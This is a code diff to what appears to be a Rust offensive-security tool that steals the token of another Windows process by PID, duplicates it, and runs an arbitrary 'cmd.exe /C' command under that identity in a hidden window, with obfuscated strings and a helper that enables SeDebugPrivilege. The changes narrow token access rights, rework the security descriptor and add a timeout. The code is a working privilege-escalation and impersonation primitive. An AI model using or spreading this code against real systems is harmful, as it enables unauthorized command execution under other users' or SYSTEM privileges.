@@ -1,18 +1,15 @@
 use core::time;
-use std::mem::{zeroed};
 use std::thread;
 use std::io::Error;
 use colored::Colorize;
-use windows_sys::Win32::Security::Authorization::{ConvertStringSecurityDescriptorToSecurityDescriptorA, SDDL_REVISION_1};
-use windows_sys::Win32::Security::{TOKEN_ALL_ACCESS, SECURITY_ATTRIBUTES, InitializeSecurityDescriptor, PSECURITY_DESCRIPTOR};
+use windows_sys::Win32::Security::{SECURITY_ATTRIBUTES, InitializeSecurityDescriptor, TOKEN_QUERY, TOKEN_DUPLICATE, SECURITY_DESCRIPTOR};
 use windows_sys::Win32::System::Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock};
 use windows_sys::Win32::System::SystemInformation::GetSystemDirectoryW;
 use windows_sys::Win32::System::SystemServices::{SECURITY_DESCRIPTOR_REVISION, SE_IMPERSONATE_NAME};
 use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
 use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE, MAX_PATH};
-use windows_sys::Win32::Storage::FileSystem::{ReadFile};
-use windows_sys::core::PCSTR;
+use windows_sys::Win32::Storage::FileSystem::ReadFile;
 use std::ptr::null_mut;
 use obfstr::obfstr;
 use windows_sys::Win32::System::Pipes::{CreatePipe};
@@ -80,7 +77,8 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
             CloseHandle(process_handle);
             return Err(format!("{} Error: {}",obfstr!("OpenProcess"), Error::last_os_error()).to_owned());
         }
-        if OpenProcessToken(process_handle,  TOKEN_ALL_ACCESS, &mut token_handle) == 0 {
+
+        if OpenProcessToken(process_handle,  TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle) == 0 {
             CloseHandle(process_handle);
             CloseHandle(token_handle);
             return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
@@ -111,32 +109,24 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
 
         trace!("[?] Token successfully duplicated");
 
-        trace!("[?] Initialize PSECURITY_DESCRIPTOR");
+        let mut sa : SECURITY_ATTRIBUTES = std::mem::zeroed::<SECURITY_ATTRIBUTES>();
+        let mut sd : SECURITY_DESCRIPTOR = std::mem::zeroed::<SECURITY_DESCRIPTOR>();
 
-        let mut sa : SECURITY_ATTRIBUTES = zeroed();
-        let mut sd : PSECURITY_DESCRIPTOR = zeroed();
-
-        if InitializeSecurityDescriptor(std::mem::transmute(&mut sd), SECURITY_DESCRIPTOR_REVISION) == 0 {
+        if InitializeSecurityDescriptor(&mut sd as *mut _ as *mut _, SECURITY_DESCRIPTOR_REVISION) == 0 {
             CloseHandle(process_handle);
             CloseHandle(token_handle);
             CloseHandle(duplicate_token_handle);
             return Err(format!("{} Error: {}",obfstr!("InitializeSecurityDescriptor"), Error::last_os_error()).to_owned());
         }
 
-        sa.lpSecurityDescriptor = sd;
+        trace!("[?] SECURITY_DESCRIPTOR initialized");
 
-        trace!("[?] Initialize SECURITY_ATTRIBUTES");
+        sa.lpSecurityDescriptor = &mut sd as *mut _ as *mut _;
 
-        let ssd = "D:(A;OICI;GA;;;AU)".as_ptr() as *const u8 as PCSTR;
-        if ConvertStringSecurityDescriptorToSecurityDescriptorA(ssd, SDDL_REVISION_1, &mut(sa.lpSecurityDescriptor), null_mut()) == 0 {
-            CloseHandle(process_handle);
-            CloseHandle(token_handle);
-            CloseHandle(duplicate_token_handle);
-            return Err(format!("{} Error: {}",obfstr!("ConvertStringSecurityDescriptorToSecurityDescriptorA"), Error::last_os_error()).to_owned());
-        }        
-        
-        let mut read_pipe: HANDLE = std::mem::zeroed();
-        let mut write_pipe: HANDLE = std::mem::zeroed();
+        trace!("[?] SECURITY_ATTRIBUTES initialized ");
+
+        let mut read_pipe: HANDLE = std::mem::zeroed::<HANDLE>();
+        let mut write_pipe: HANDLE = std::mem::zeroed::<HANDLE>();
      
         if CreatePipe(&mut read_pipe, &mut write_pipe, &sa, 0) == FALSE {
             return Err(format!("{} Error: {}",obfstr!("CreatePipe"), Error::last_os_error()).to_owned());
@@ -154,6 +144,8 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
             return Err(format!("{} Error: {}",obfstr!("CreateEnvironmentBlock"), Error::last_os_error()).to_owned());
         }
 
+        trace!("[?] Environment block created");
+
         let mut si: STARTUPINFOW = std::mem::zeroed();
         let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
@@ -164,12 +156,15 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
         si.lpDesktop = "WinSta0\\Default\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr();
         si.wShowWindow = SW_HIDE as u16;
 
+        trace!("[?] STARTUPINFOW initialized");
+
         let mut working_dir = Vec::with_capacity(MAX_PATH as usize);
         GetSystemDirectoryW(working_dir.as_mut_ptr(), MAX_PATH);
 
         let mut cmd = (format!("{}{}",obfstr!("cmd.exe /C "),command).to_owned() + "\0").encode_utf16().collect::<Vec<u16>>();
 
         trace!("[?] Command to be executed: {:?}",String::from_utf16(&cmd).expect("command"));
+
         if CreateProcessWithTokenW(
             duplicate_token_handle,
             LOGON_WITH_PROFILE,
@@ -198,11 +193,21 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
         thread::sleep(time::Duration::from_millis(500));
 
         let mut exit_code = 0u32;
+        let now = std::time::SystemTime::now();
         loop {
             GetExitCodeProcess(pi.hProcess, &mut exit_code);
             trace!("[?] Process exit code is: {}",exit_code);
             if exit_code as i32 != STILL_ACTIVE {
                 break;
+            }
+            if now.elapsed().unwrap() >= std::time::Duration::from_secs(30) {
+                CloseHandle(process_handle);
+                CloseHandle(token_handle);
+                CloseHandle(read_pipe);
+                CloseHandle(write_pipe);
+                DestroyEnvironmentBlock(environment_block);
+                CloseHandle(duplicate_token_handle);
+                return Err(format!("{}",obfstr!("Process timed out")).to_owned());
             }
             thread::sleep(time::Duration::from_millis(500));
             trace!("[?] Waiting for command to finish");
@@ -240,7 +245,6 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
         return Ok(true)
     }   
 }
-
 
 /// Function to enable Windows Privileges SeDebugPrivilege and SeAssignPrimaryToken
 pub fn se_priv_enable() -> Result<bool, String>{
